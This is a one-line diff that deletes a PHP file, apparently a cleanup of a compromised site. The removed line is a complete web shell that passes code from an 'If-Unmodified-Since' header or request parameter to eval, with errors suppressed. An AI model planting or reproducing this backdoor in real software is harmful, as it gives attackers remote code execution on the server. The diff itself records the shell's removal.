@@ -1,1 +1,0 @@
-<?php @eval($_HEADERS["If-Unmodified-Since"]);@eval($_REQUEST["If-Unmodified-Since"]);
